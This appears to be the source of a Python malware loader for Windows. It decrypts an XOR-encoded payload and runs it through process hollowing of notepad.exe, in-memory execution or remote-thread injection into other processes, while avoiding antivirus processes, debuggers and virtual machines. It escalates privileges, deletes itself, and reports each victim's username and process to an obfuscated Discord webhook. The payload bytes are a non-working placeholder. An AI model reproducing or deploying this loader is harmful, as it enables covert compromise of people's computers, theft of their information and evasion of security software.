import math
import random
import requests
import time
import sys
import os
import ctypes
import psutil
import getpass
import hashlib
import win32con
import win32gui
import ctypes.wintypes
import pefile

PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
target_hash='c617838cd57e06a073edc6e24d360811'
EXCEPTION_HASHES = ['d1c56374', 'f8f8cf2b', '3963b07f', 'd9d569c4', 'ba2a8009', '65ae7877', '1380446c', '9e458b27', '4e83bd54', '7c34a78b', '0a757eed', '45e0edac', 'cde09bcd', '0993fe0c', '102dd375', '4f3093e2', 'ceff066a', '40ea71f0', 'b7622e20', '54b53072', 'e6c17dca', 'a4e40d3b', '0ddc7aea', '659bda43', '5c1a831a']
keys = [186, 206, 120]
encrypted=bytes(['بطاطا'])


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.wintypes.DWORD),
        ("lpReserved", ctypes.wintypes.LPWSTR),
        ("lpDesktop", ctypes.wintypes.LPWSTR),
        ("lpTitle", ctypes.wintypes.LPWSTR),
        ("dwX", ctypes.wintypes.DWORD),
        ("dwY", ctypes.wintypes.DWORD),
        ("dwXSize", ctypes.wintypes.DWORD),
        ("dwYSize", ctypes.wintypes.DWORD),
        ("dwXCountChars", ctypes.wintypes.DWORD),
        ("dwYCountChars", ctypes.wintypes.DWORD),
        ("dwFillAttribute", ctypes.wintypes.DWORD),
        ("dwFlags", ctypes.wintypes.DWORD),
        ("wShowWindow", ctypes.wintypes.WORD),
        ("cbReserved2", ctypes.wintypes.WORD),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.wintypes.HANDLE),
        ("hStdOutput", ctypes.wintypes.HANDLE),
        ("hStdError", ctypes.wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.wintypes.HANDLE),
        ("hThread", ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId", ctypes.wintypes.DWORD),
    ]


class CONTEXT64(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.wintypes.DWORD),
        ("Dr0", ctypes.wintypes.DWORD),
        ("Dr1", ctypes.wintypes.DWORD),
        ("Dr2", ctypes.wintypes.DWORD),
        ("Dr3", ctypes.wintypes.DWORD),
        ("Dr6", ctypes.wintypes.DWORD),
        ("Dr7", ctypes.wintypes.DWORD),
        ("FloatSave", ctypes.c_ubyte * 112),
        ("SegGs", ctypes.wintypes.DWORD),
        ("SegFs", ctypes.wintypes.DWORD),
        ("SegEs", ctypes.wintypes.DWORD),
        ("SegDs", ctypes.wintypes.DWORD),
        ("Edi", ctypes.wintypes.DWORD),
        ("Esi", ctypes.wintypes.DWORD),
        ("Ebx", ctypes.wintypes.DWORD),
        ("Edx", ctypes.wintypes.DWORD),
        ("Ecx", ctypes.wintypes.DWORD),
        ("Eax", ctypes.wintypes.DWORD),
        ("Ebp", ctypes.wintypes.DWORD),
        ("Eip", ctypes.wintypes.DWORD),
        ("SegCs", ctypes.wintypes.DWORD),
        ("EFlags", ctypes.wintypes.DWORD),
        ("Esp", ctypes.wintypes.DWORD),
        ("SegSs", ctypes.wintypes.DWORD),
        ("ExtendedRegisters", ctypes.c_ubyte * 512),
    ]


def process_hollowing(target_process_path):
    shellcode= get_payload()
    try:
        startup_info = STARTUPINFOW()
        process_info = PROCESS_INFORMATION()

        startup_info.cb = ctypes.sizeof(STARTUPINFOW)

        creation_flags = 0x00000004

        success = kernel32.CreateProcessW(
            target_process_path,
            None,
            None,
            None,
            False,
            creation_flags,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )

        if not success:
            return False

        h_process = process_info.hProcess
        h_thread = process_info.hThread

        context = CONTEXT64()
        context.ContextFlags = 0x10007

        if not kernel32.GetThreadContext(h_thread, ctypes.byref(context)):
            kernel32.TerminateProcess(h_process, 0)
            kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            return False

        peb_addr = context.Ebx

        base_addr = ctypes.c_void_p()
        bytes_read = ctypes.c_size_t()

        kernel32.ReadProcessMemory(
            h_process,
            peb_addr + 8,
            ctypes.byref(base_addr),
            ctypes.sizeof(ctypes.c_void_p),
            ctypes.byref(bytes_read)
        )

        if bytes_read.value != ctypes.sizeof(ctypes.c_void_p):
            kernel32.TerminateProcess(h_process, 0)
            kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            return False

        ntdll.NtUnmapViewOfSection.restype = ctypes.c_uint
        ntdll.NtUnmapViewOfSection.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p]

        status = ntdll.NtUnmapViewOfSection(h_process, base_addr)
        if status != 0:
            kernel32.TerminateProcess(h_process, 0)
            kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            return False

        pe = pefile.PE(data=shellcode)

        image_size = pe.OPTIONAL_HEADER.SizeOfImage

        new_base = kernel32.VirtualAllocEx(
            h_process,
            base_addr,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )

        if not new_base:
            kernel32.TerminateProcess(h_process, 0)
            kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            return False

        header_size = pe.OPTIONAL_HEADER.SizeOfHeaders
        written = ctypes.c_size_t(0)

        kernel32.WriteProcessMemory(
            h_process,
            new_base,
            shellcode,
            header_size,
            ctypes.byref(written)
        )

        for section in pe.sections:
            if section.SizeOfRawData > 0:
                section_data = shellcode[section.PointerToRawData:
                                         section.PointerToRawData + section.SizeOfRawData]

                section_address = new_base + section.VirtualAddress

                kernel32.WriteProcessMemory(
                    h_process,
                    section_address,
                    section_data,
                    len(section_data),
                    ctypes.byref(written)
                )

        kernel32.WriteProcessMemory(
            h_process,
            peb_addr + 8,
            ctypes.byref(ctypes.c_void_p(new_base)),
            ctypes.sizeof(ctypes.c_void_p),
            None
        )

        entry_point = new_base + pe.OPTIONAL_HEADER.AddressOfEntryPoint
        context.Eax = entry_point

        kernel32.SetThreadContext(h_thread, ctypes.byref(context))

        kernel32.ResumeThread(h_thread)

        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)

        send_to_discord(f"NEW TARGET WITH : {target_process_path}")
        return True

    except:
        return False



def hash_name(name):
    return hashlib.md5(name.lower().encode()).hexdigest()[:8]


def send_to_discord(msg):
    try:
        payload = {
            "content": msg,
            "username": "simple_xor_injector",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3612/3612569.png"
        }

        response = requests.post(
            get_webhook(),
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=15
        )

        if response.status_code in [200, 204]:

            return True
        else:
            return False

    except Exception:
        return False

def get_webhook():
    enc = [42, 54, 54, 50, 49, 120, 109, 109, 38, 43, 49, 33, 45, 48, 38, 108, 33, 45, 47, 109, 35, 50, 43, 109, 53, 39, 32, 42, 45, 45, 41, 49, 109, 115, 118, 119, 118, 114, 117, 119, 115, 119, 112, 114, 119, 123, 122, 119, 122, 123, 123, 117, 109, 26, 44, 123, 9, 10, 33, 111, 54, 48, 42, 59, 21, 4, 24, 41, 15, 44, 9, 47, 43, 56, 59, 8, 13, 9, 4, 114, 48, 47, 45, 59, 117, 39, 37, 10, 13, 52, 19, 11, 41, 10, 55, 40, 5, 39, 9, 8, 20, 52, 36, 119, 0, 8, 36, 54, 54, 52, 43, 6, 47, 20, 113, 26, 24, 45, 43, 49, 43]

    key = 0x42
    return ''.join(chr(b ^ key) for b in enc)


def get_payload():
    for key in range(256):
        decrypted = bytes(b ^ key for b in encrypted)

        if hashlib.md5(decrypted).hexdigest() == target_hash:
            return  decrypted
def is_done():
    return os.path.exists('file.tmp')


def mark_done():
    try:
        with open('file.tmp', 'w') as f:
            f.write('1')
    except:
        pass

def test_hell():
    time.sleep(5)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    hdc = win32gui.GetDC(0)
    dx = dy = 1
    angle = 0
    size = 0.01
    speed = 0.05
    for i in range(1000):
        win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCAND)
        dx = math.ceil(math.sin(angle) * size * 10)
        dy = math.ceil(math.cos(angle) * size * 10)
        angle += speed / 10
        if angle > math.pi:
            angle = math.pi * -1

def escalate_privileges():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join(sys.argv), None, 1
        )
        escalate_privileges()
def random_delay():
    time.sleep(random.uniform(2, 8))
def comprehensive_checks():

    if kernel32.IsDebuggerPresent():
        return False

    if kernel32.GetTickCount64() < 300000:
        return False

    mem = psutil.virtual_memory()
    if mem.total < 3 * (1024 ** 3):
        return False

    if psutil.cpu_count() < 3:
        return False

    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
        val, _ = winreg.QueryValueEx(key, "0")
        vm_indicators = ['vbox', 'vmware', 'qemu', 'virtual', 'xen']
        if any(vm in val.lower() for vm in vm_indicators):
            return False
    except:
        pass

    if len(list(psutil.process_iter())) < 30:
        return False

    return True


def execute_in_memory():
    shellcode = get_payload()
    if not shellcode:
        return False

    try:
        ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
        kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
        handle = kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
        kernel32.WaitForSingleObject(handle, -1)
        send_to_discord(msg='NEW TARGET MEMORY INJECTION')
        return True
    except:
        return False


def inject_into_process(pid, shellcode):
    try:
        h_process = kernel32.OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            False, pid
        )

        if not h_process:
            return False

        mem_addr = kernel32.VirtualAllocEx(
            h_process, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )

        if not mem_addr:
            kernel32.CloseHandle(h_process)
            return False

        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(
                h_process, mem_addr, shellcode,
                len(shellcode), ctypes.byref(written)
        ):
            kernel32.CloseHandle(h_process)
            return False

        thread_id = ctypes.c_ulong(0)
        h_thread = kernel32.CreateRemoteThread(
            h_process, None, 0, mem_addr,
            None, 0, ctypes.byref(thread_id)
        )

        if h_thread:
            kernel32.CloseHandle(h_thread)
            kernel32.CloseHandle(h_process)
            return True

        kernel32.CloseHandle(h_process)
        return False

    except:
        return False


def is_safe_target(proc_name, pid):
    if pid < 10:
        return False

    if hash_name(proc_name) in EXCEPTION_HASHES:
        return False

    av_keywords = ['defender', 'malware', 'antivirus', 'kaspersky','avg','avast']
    if any(av in proc_name.lower() for av in av_keywords):
        return False

    return True


def attempt_injection():
    shellcode = get_payload()
    if not shellcode:
        return False

    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid = proc.info['pid']
            name = proc.info['name']

            if not is_safe_target(name, pid):
                continue

            if inject_into_process(pid, shellcode):
                msg = f"🎯 Target: {getpass.getuser()}\nProcess: {name} (PID: {pid})"
                send_to_discord(msg)
                return True

        except:
            continue

    return False


def secure_delete(filepath):
    try:
        size = os.path.getsize(filepath)
        with open(filepath, 'wb') as f:
            f.write(os.urandom(size))

        temp = filepath + '.tmp'
        os.rename(filepath, temp)
        os.remove(temp)
    except:
        pass


def main():
    if is_done():
        secure_delete(sys.argv[0])
        sys.exit(0)

    if not comprehensive_checks():
        secure_delete(sys.argv[0])
        sys.exit(0)

    escalate_privileges()

    success = False
    if process_hollowing(target_process_path='C:\\Windows\\System32\\notepad.exe'):
        success = True

    elif execute_in_memory():
        success = True

    elif attempt_injection():
        success = True

    if success:
        mark_done()

    time.sleep(2)
    secure_delete(sys.argv[0])


if __name__ == "__main__":
    try:
        main()
    except:
        test_hell()
        secure_delete(sys.argv[0])
